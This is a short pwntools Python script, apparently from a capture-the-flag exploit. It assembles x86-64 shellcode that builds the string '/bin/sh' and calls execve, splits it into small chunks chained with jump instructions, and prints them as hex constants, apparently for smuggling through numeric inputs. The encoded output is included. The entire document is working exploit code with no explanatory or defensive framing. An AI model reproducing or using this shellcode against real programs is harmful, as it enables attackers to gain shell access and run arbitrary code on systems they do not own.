from pwn import *

context(arch='amd64')
jmp = b'\xeb\x0c'
shell = u64(b'/bin/sh\x00')

def make_double(code):
	assert len(code) <= 6
	print(hex(u64(code.ljust(6, b'\x90') + jmp))[2:])

make_double(asm("push %d; pop rax" % (shell >> 0x20)))
make_double(asm("push %d; pop rdx" % (shell % 0x100000000)))
make_double(asm("shl rax, 0x20; xor esi, esi"))
make_double(asm("add rax, rdx; xor edx, edx; push rax"))
code = asm("mov rdi, rsp; push 59; pop rax; syscall")
assert len(code) <= 8
print(hex(u64(code.ljust(8, b'\x90')))[2:])

"""
Output:
ceb580068732f68
ceb5a6e69622f68
cebf63120e0c148
ceb50d231d00148
50f583b6ae78948
"""
